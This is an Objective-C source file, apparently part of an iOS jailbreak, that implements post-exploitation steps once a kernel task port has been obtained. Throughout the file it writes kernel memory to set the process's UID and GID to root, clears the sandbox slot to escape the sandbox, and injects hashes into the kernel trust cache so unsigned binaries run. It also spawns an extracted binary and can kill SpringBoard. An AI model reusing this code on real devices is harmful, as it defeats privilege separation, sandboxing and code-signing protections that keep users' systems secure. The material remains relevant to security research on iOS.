#import <Foundation/Foundation.h>
#include "post.h"
#import "kernel_memory.h"
#import "kernel_slide.h"
#import "offsets.h"
#include <sys/sysctl.h>
#include "parameters.h"
#include "patchfinder64.h"
#include <UIKit/UIDevice.h>
#include <sys/utsname.h>
#include "log.h"
#include <spawn.h>
#include <dlfcn.h>
#include "CSCommon.h"
#include <sys/stat.h>
#include "ArchiveFile.h"

@implementation Post

// Debugging //

- (void)debug {
    usleep(0); // p [self save];
    usleep(0); // p [self mobile];
    usleep(0); // p log_internal('I', "Debugging...", NULL);
    usleep(0); // p log_internal('I', "Finished debugging", NULL);
    usleep(0); // p [self restore];
}

// Variables //

static uint64_t SANDBOX = 0;
static int SAVED_SET[3] = { 0, 0, 0 };

// Extract //

- (bool)extract:(NSString *)from to:(NSString *)to {
    if (![[NSFileManager defaultManager] fileExistsAtPath:to]) return false;
    if (![[NSFileManager defaultManager] fileExistsAtPath:from]) return false;
    return [[ArchiveFile alloc] extractFile:from to:to];
}

// General post-exploitation method //

- (bool)go {
    // Check if tfp0 is valid
    if (!MACH_PORT_VALID(kernel_task_port)) {
        return false;
    }
    // Init offsets
    offs_init();
    // Get root
    [self root];
    // Unsandbox
    [self unsandbox];
    // If we can, initialise patchfinder64
    [self initialise_patchfinder64];
    // If we can, run a test binary
    // Expected return code: 12 (main returns 12)
    [self extract:[[NSBundle mainBundle] pathForResource:@"bin.tar" ofType:@"gz"] to:[[NSBundle mainBundle] bundlePath]];
    NSString *binPath = [[[NSBundle mainBundle] bundlePath] stringByAppendingString:@"/bin"];
    int ret = [self execute:NSStringToArgs(binPath)];
    unlink(binPath.UTF8String);
    // If we can, terminate patchfinder64
    [self terminate_patchfinder64];
    // For debugging purposes
    [self debug];
    // Did we succeed?
    bool success = [self isRoot] && ![self isSandboxed] && ret == 12;
    if (success) INFO("Post-exploitation was successful!");
    if (!success) INFO("Post-exploitation failed.");
    return success;
}

// patchfinder64 //

- (BOOL)is_patchfinder64_initialised {
    return patchfinder64_is_initialised();
}

- (void)initialise_patchfinder64 {
    if ([self is_patchfinder64_initialised]) return;
    if ([self isSupportedAndIsNotA12]) {
        // Kernel base
        uint64_t base = [self kernel_base];
        // Initialise patchfinder64
        init_patchfinder64(base);
        INFO("Initialised patchfinder64");
    }
}

- (void)terminate_patchfinder64 {
    if (![self is_patchfinder64_initialised]) return;
    if ([self isSupportedAndIsNotA12]) {
        // Terminate patchfinder64
        term_patchfinder64();
        INFO("Terminated patchfinder64");
    }
}

// Kernel base/slide //

- (uint64_t)kernel_slide {
    if (!kernel_slide) kernel_slide_init();
    INFO("Found kernel slide: 0x%llx", kernel_slide);
    return kernel_slide;
}

- (uint64_t)kernel_base {
    uint64_t kernel_base = [self kernel_slide] + STATIC_ADDRESS(kernel_base);
    INFO("Found kernel base: 0x%llx", kernel_base);
    return kernel_base;
}

// Checks //

- (struct utsname)uname {
    struct utsname u;
    uname(&u);
    return u;
}

- (int)modelDigitsBeforeComma {
    struct utsname u = [self uname];
    char read[257];
    int ii = 0;
    for (int i = 0; i < 256; i++) {
        char chr = u.machine[i];
        long num = chr - '0';
        if (num == -4 || chr == 0) {
            break;
        }
        if (num >= 0 && num <= 9) {
            read[ii] = chr;
            ii++;
        }
    }
    read[ii + 1] = 0;
    int digits = atoi(read);
    return digits;
}

- (bool)isSupported {
    if ([[UIDevice currentDevice].model isEqualToString:@"iPod touch"]) {
        return true;
    }
    int digits = [self modelDigitsBeforeComma];
    if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPhone) {
        if (digits < 8) {
            return false;
        }
    } else if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad) {
        if (digits < 6) {
            return false;
        }
    }
    return true;
}

- (bool)isUnsupported {
    return ![self isSupported];
}

- (bool)isA12 {
    if ([[UIDevice currentDevice].model isEqualToString:@"iPod touch"]) {
        return false;
    }
    int digits = [self modelDigitsBeforeComma];
    if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPhone) {
        if (digits == 11) {
            //INFO("This is an A12 device");
            return true;
        }
    } else if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPad) {
        if (digits == 8) {
            //INFO("This is an A12 device");
            return true;
        }
    }
    //INFO("This isn't an A12 device");
    return false;
}

- (bool)isSupportedAndIsNotA12 {
    return [self isSupported] && ![self isA12];
}

// Users //

- (bool)isRoot {
    return !getuid() && !getgid();
}

- (bool)isMobile {
    return getuid() == 501 && getgid() == 501;
}

- (void)setUID:(uid_t)uid {
    [self setUID:uid forProc:[self selfproc]];
}

- (void)setUID:(uid_t)uid forProc:(uint64_t)proc {
    if (getuid() == uid) return;
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    kernel_write32(proc + off_p_uid, uid);
    kernel_write32(proc + off_p_ruid, uid);
    kernel_write32(ucred + off_ucred_cr_uid, uid);
    kernel_write32(ucred + off_ucred_cr_ruid, uid);
    kernel_write32(ucred + off_ucred_cr_svuid, uid);
    INFO("Overwritten UID to %i for proc at 0x%llx", uid, proc);
}

- (void)setGID:(gid_t)gid {
    [self setGID:gid forProc:[self selfproc]];
}

- (void)setGID:(gid_t)gid forProc:(uint64_t)proc {
    if (getgid() == gid) return;
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    kernel_write32(proc + off_p_gid, gid);
    kernel_write32(proc + off_p_rgid, gid);
    kernel_write32(ucred + off_ucred_cr_rgid, gid);
    kernel_write32(ucred + off_ucred_cr_svgid, gid);
    INFO("Overwritten GID to %i for proc at 0x%llx", gid, proc);
}

- (void)setUIDAndGID:(int)both {
    [self setUIDAndGID:both forProc:[self selfproc]];
}

- (void)setUIDAndGID:(int)both forProc:(uint64_t)proc {
    [self setUID:both forProc:proc];
    [self setGID:both forProc:proc];
}

- (void)root {
    [self setUIDAndGID:0];
}

- (void)mobile {
    [self setUIDAndGID:501];
}

// Sandbox //

- (bool)isSandboxed {
    if (!MACH_PORT_VALID(kernel_task_port)) {
        [[NSFileManager defaultManager] createFileAtPath:@"/var/TESTF" contents:nil attributes:nil];
        if (![[NSFileManager defaultManager] fileExistsAtPath:@"/var/TESTF"]) return true;
        [[NSFileManager defaultManager] removeItemAtPath:@"/var/TESTF" error:nil];
        return false;
    }
    return kernel_read64(kernel_read64(kernel_read64([self selfproc] + off_p_ucred) + off_ucred_cr_label) + off_sandbox_slot) != 0;
}

- (bool)isSandboxed:(uint64_t)proc {
    return kernel_read64(kernel_read64(kernel_read64(proc + off_p_ucred) + off_ucred_cr_label) + off_sandbox_slot) != 0;
}

- (void)sandbox {
    [self sandbox:[self selfproc]];
}

- (void)sandbox:(uint64_t)proc {
    INFO("Sandboxed proc at 0x%llx", proc);
    if ([self isSandboxed]) return;
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    uint64_t cr_label = kernel_read64(ucred + off_ucred_cr_label);
    kernel_write64(cr_label + off_sandbox_slot, SANDBOX);
    SANDBOX = 0;
}

- (void)unsandbox {
    [self unsandbox:[self selfproc]];
}

- (void)unsandbox:(uint64_t)proc {
    INFO("Unsandboxed proc at 0x%llx", proc);
    if (![self isSandboxed]) return;
    uint64_t ucred = kernel_read64(proc + off_p_ucred);
    uint64_t cr_label = kernel_read64(ucred + off_ucred_cr_label);
    if (SANDBOX == 0) SANDBOX = kernel_read64(cr_label + off_sandbox_slot);
    kernel_write64(cr_label + off_sandbox_slot, 0);
}

// Trust Cache //
// thx sbingner/xerub

- (bool)isInAMFIStaticCache:(NSString *)path {
    extern int MISValidateSignatureAndCopyInfo(NSString *file, NSDictionary *options, NSDictionary **info);
    extern NSString *kMISValidationOptionAllowAdHocSigning;
    extern NSString *kMISValidationOptionRespectUppTrustAndAuthorization;
    return !MISValidateSignatureAndCopyInfo(path, @{kMISValidationOptionAllowAdHocSigning: @YES, kMISValidationOptionRespectUppTrustAndAuthorization: @YES}, NULL);
}

- (NSString *)cdhashFor:(NSString *)file {
    NSString *cdhash = nil;
    const char *filename = file.UTF8String;
    SecStaticCodeRef staticCode;
    
    OSStatus SecStaticCodeCreateWithPathAndAttributes(CFURLRef path, SecCSFlags flags, CFDictionaryRef attributes, SecStaticCodeRef _Nullable *staticCode);
    OSStatus result = SecStaticCodeCreateWithPathAndAttributes(CFURLCreateWithFileSystemPath(kCFAllocatorDefault, (CFStringRef)file, kCFURLPOSIXPathStyle, false), kSecCSDefaultFlags, NULL, &staticCode);
    
    if (result != errSecSuccess) {
        CFStringRef (*_SecCopyErrorMessageString)(OSStatus status, void * __nullable reserved) = NULL;
        if (_SecCopyErrorMessageString != NULL) {
            CFStringRef error = _SecCopyErrorMessageString(result, NULL);
            ERROR("Unable to generate cdhash for %s: %s", filename, [(__bridge id)error UTF8String]);
            CFRelease(error);
        } else {
            ERROR("Unable to generate cdhash for %s: %d", filename, result);
        }
        return nil;
    }
    
    CFDictionaryRef cfinfo;
    OSStatus SecCodeCopySigningInformation(SecStaticCodeRef code, SecCSFlags flags, CFDictionaryRef  _Nullable *information);
    result = SecCodeCopySigningInformation(staticCode, kSecCSDefaultFlags, &cfinfo);
    NSDictionary *info = CFBridgingRelease(cfinfo);
    CFRelease(staticCode);
    if (result) {
        ERROR("Unable to copy cdhash info for %s", filename);
        return nil;
    }
    NSArray *cdhashes = info[@"cdhashes"];
    NSArray *algos = info[@"digest-algorithms"];
    NSUInteger algoIndex = [algos indexOfObject:@(2)];
    
    if (cdhashes == nil) {
        ERROR("%s: no cdhashes", filename);
    } else if (algos == nil) {
        ERROR("%s: no algos", filename);
    } else if (algoIndex == NSNotFound) {
        ERROR("%s: does not have SHA256 hash", filename);
    } else {
        cdhash = [cdhashes objectAtIndex:algoIndex];
        if (cdhash == nil) {
            ERROR("%s: missing SHA256 cdhash entry", filename);
        }
    }
    return cdhash;
}

- (NSArray *)filteredHashes:(uint64_t)trust_chain hashes:(NSDictionary *)hashes {
    NSMutableDictionary *filtered = [hashes mutableCopy];
    for (NSData *cdhash in [filtered allKeys]) {
        if ([self isInAMFIStaticCache:filtered[cdhash]]) {
            //WARNING("%s: already in static trustcache, not reinjecting", [filtered[cdhash] UTF8String]);
            [filtered removeObjectForKey:cdhash];
        }
    }
    struct trust_mem {
        uint64_t next;
        unsigned char uuid[16];
        unsigned int count;
    } __attribute__((packed)) search;
    search.next = trust_chain;
    while (search.next) {
        uint64_t searchAddr = search.next;
        kread(searchAddr, &search, sizeof(struct trust_mem));
        char *data = malloc(search.count * 20);
        kread(searchAddr + sizeof(struct trust_mem), data, search.count * 20);
        size_t data_size = search.count * 20;
        for (char *dataref = data; dataref <= data + data_size - 20; dataref += 20) {
            NSData *cdhash = [NSData dataWithBytesNoCopy:dataref length:20 freeWhenDone:NO];
            NSString *hashName = filtered[cdhash];
            if (hashName != nil) {
                //WARNING("%s: already in dynamic trustcache, not reinjecting", [hashName UTF8String]);
                [filtered removeObjectForKey:cdhash];
                if ([filtered count] == 0) {
                    free(data);
                    return nil;
                }
            }
        }
        free(data);
    }
    return [filtered allKeys];
}

- (int)injectTrustCache:(NSArray <NSString *> *)files {
    uint64_t trust_chain = find_trustcache();
    struct {
        uint64_t next;
        unsigned char uuid[16];
        unsigned int count;
    } __attribute__((packed)) mem;
    uint64_t kernel_trust = 0;
    mem.next = kernel_read64(trust_chain);
    mem.count = 0;
    *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
    *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;
    NSMutableDictionary *hashes = [NSMutableDictionary new];
    int errors = 0;
    for (NSString *file in files) {
        NSString *cdhash = [self cdhashFor:file];
        if (cdhash == nil) {
            errors++;
        } else {
            if (hashes[cdhash] == nil) {
                //INFO("%s: OK", file.UTF8String);
                hashes[cdhash] = file;
            } else {
                WARNING("%s: same as %s (ignoring)", file.UTF8String, [hashes[cdhash] UTF8String]);
            }
        }
    }
    unsigned numHashes = (unsigned)[hashes count];
    if (numHashes < 1) {
        ERROR("Found no hashes to inject");
        return errors;
    }
    NSArray *filtered = [self filteredHashes:mem.next hashes:hashes];
    unsigned hashesToInject = (unsigned)[filtered count];
    if (hashesToInject < 1) {
        return errors;
    }
    size_t length = (sizeof(mem) + hashesToInject * 20 + 0xFFFF) & ~0xFFFF;
    char *buffer = malloc(hashesToInject * 20);
    if (buffer == NULL) {
        ERROR("Unable to allocate memory for cdhashes: %s", strerror(errno));
        return -3;
    }
    char *curbuf = buffer;
    for (NSData *hash in filtered) {
        memcpy(curbuf, [hash bytes], 20);
        curbuf += 20;
    }
    kernel_trust = kernel_alloc(length);
    mem.count = hashesToInject;
    kwrite(kernel_trust, &mem, sizeof(mem));
    kwrite(kernel_trust + sizeof(mem), buffer, mem.count * 20);
    kernel_write64(trust_chain, kernel_trust);
    INFO("%s", (char *)[NSString stringWithFormat:@"Injected %i new hash%s", hashesToInject, hashesToInject == 1 ? "" : "es"].UTF8String);
    return errors;
}

// Execute //

- (int)execute:(char *[])args {
    if (![self is_patchfinder64_initialised]) return false;
    INFO("Executing \"%s\"...", args[0]);
    pid_t pid, ret;
    posix_spawn_file_actions_t file_actions;
    posix_spawn_file_actions_init(&file_actions);
    posix_spawn_file_actions_addopen(&file_actions, 1, [[NSBundle mainBundle].bundlePath stringByAppendingString:@"/TMP.log"].UTF8String, O_RDWR | O_CREAT | O_TRUNC, 0777);
    posix_spawn_file_actions_adddup2(&file_actions, 1, 2);
    ret = [self posix_spawnp:&pid path:args[0] file_actions:&file_actions attrp:NULL argv:(char **)&args envp:NULL];
    if (ret) {
        unlink([[NSBundle mainBundle].bundlePath stringByAppendingString:@"/TMP.log"].UTF8String);
        ERROR("Failed to execute \"%s\"", args[0]);
        return ret;
    }
    waitpid(pid, &ret, 0);
    NSError *err;
    NSString *log = [NSString stringWithContentsOfFile:[[NSBundle mainBundle].bundlePath stringByAppendingString:@"/TMP.log"] encoding:NSUTF8StringEncoding error:&err];
    bool starstarstarstuff = false;
    if (!err && starstarstarstuff && log.UTF8String != NULL) LOG("*** BEGINNING OUTPUT OF \"%s\" ***\n", args[0]);
    if (!err && log.UTF8String != NULL) LOG("%s%s", log.UTF8String, [log hasSuffix:@"\n"] ? "" : "\n");
    if (!err && starstarstarstuff && log.UTF8String != NULL) LOG("*** ENDED OUTPUT OF \"%s\" ***\n", args[0]);
    unlink([[NSBundle mainBundle].bundlePath stringByAppendingString:@"/TMP.log"].UTF8String);
    NSString *str = @"exited with code";
    if (WIFEXITED(ret)) {
        ret = WEXITSTATUS(ret);
    } else if (WIFSIGNALED(ret)) {
        ret = WTERMSIG(ret);
        str = @"exited due to signal";
    } else if (WIFSTOPPED(ret)) {
        ret = WSTOPSIG(ret);
        str = @"stopped due to signal";
    } else {
        ret = 0;
    }
    INFO("Executed \"%s\", which has %s %i", args[0], str.UTF8String, ret);
    return ret;
}

- (int)posix_spawn:(pid_t *)pid path:(const char *)path file_actions:(posix_spawn_file_actions_t)file_actions attrp:(posix_spawnattr_t)attrp argv:(char *[])argv envp:(char **)envp {
    if (![self is_patchfinder64_initialised]) return false;
    [self injectTrustCache:@[@(path)]];
    return posix_spawn(pid, path, file_actions, attrp, (char **)&argv, envp);
}

- (int)posix_spawnp:(pid_t *)pid path:(const char *)path file_actions:(posix_spawn_file_actions_t)file_actions attrp:(posix_spawnattr_t)attrp argv:(char *[])argv envp:(char **)envp {
    if (![self is_patchfinder64_initialised]) return false;
    [self injectTrustCache:@[@(path)]];
    return posix_spawnp(pid, path, file_actions, attrp, (char **)&argv, envp);
}

// Procs //

- (uint64_t)allproc {
    static uint64_t proc = 0;
    if (proc) return proc;
    proc = [self selfproc];
    // i think the max pid value is 99998?
    for (pid_t i = 0; i < 99998 - getpid(); i++) {
        uint64_t tmp_proc = kernel_read64(proc + 8);
        if (!tmp_proc /* if we can't read here, the previously read address was allproc */) {
            INFO("Found allproc: 0x%llx", proc);
            return proc;
        }
        // not allproc - let's try this one?
        proc = tmp_proc;
    }
    return 0;
}

- (uint64_t)selfproc {
    static uint64_t proc = 0;
    if (!proc) {
        proc = kernel_read64(current_task + OFFSET(task, bsd_info));
        INFO("Found proc at 0x%llx for PID %i", proc, getpid());
    }
    return proc;
}

- (uint64_t)kernproc {
    static uint64_t proc = 0;
    if (!proc) {
        proc = kernel_read64(kernel_task + OFFSET(task, bsd_info));
        INFO("Found proc at 0x%llx for PID %i", proc, 0);
    }
    return proc;
}

- (uint64_t)proc_for_pid:(pid_t)pid {
    if (pid == getuid()) {
        return [self selfproc];
    } else if (!pid) {
        return [self kernproc];
    }
    uint64_t proc = [self allproc];
    while (proc) {
        if (kernel_read32(proc + off_p_pid) == pid) {
            INFO("Found proc at 0x%llx for PID %i", proc, pid);
            return proc;
        }
        proc = kernel_read64(proc);
    }
    return 0;
}

- (pid_t)pid_for_name:(NSString *)name /* case-sensitive process name or executable path */ {
    [self save];
    [self root];
    static int maxArgumentSize = 0;
    size_t size = sizeof(maxArgumentSize);
    sysctl((int[]){ CTL_KERN, KERN_ARGMAX }, 2, &maxArgumentSize, &size, NULL, 0);
    int mib[3] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL };
    struct kinfo_proc *info;
    size_t length;
    sysctl(mib, 3, NULL, &length, NULL, 0);
    info = malloc(length);
    sysctl(mib, 3, info, &length, NULL, 0);
    for (int i = 0; i < length / sizeof(struct kinfo_proc); i++) {
        pid_t pid = info[i].kp_proc.p_pid;
        if (pid == 0) {
            continue;
        }
        size_t size = maxArgumentSize;
        char *buffer = (char *)malloc(length);
        sysctl((int[]){ CTL_KERN, KERN_PROCARGS2, pid }, 3, buffer, &size, NULL, 0);
        NSString *executable = [NSString stringWithCString:buffer + sizeof(int) encoding:NSUTF8StringEncoding];
        free(buffer);
        if ([executable isEqual:name]) {
            INFO("Found PID %i for name %s", pid, name.UTF8String);
            free(info);
            [self restore];
            return pid;
        } else if ([[executable lastPathComponent] isEqual:name]) {
            INFO("Found PID %i for name %s", pid, name.UTF8String);
            free(info);
            [self restore];
            return pid;
        }
    }
    free(info);
    [self restore];
    return -1;
}

- (void)respring {
    [self unsandbox];
    kill([self pid_for_name:@"/System/Library/CoreServices/SpringBoard.app/SpringBoard"], SIGTERM);
}

// Save/Restore //

- (void)save {
    SAVED_SET[0] = getuid();
    SAVED_SET[1] = getgid();
    SAVED_SET[2] = [self isSandboxed];
}

- (void)restore {
    [self setUID:SAVED_SET[0]];
    [self setGID:SAVED_SET[1]];
    SAVED_SET[2] ? [self sandbox] : [self unsandbox];
}

@end
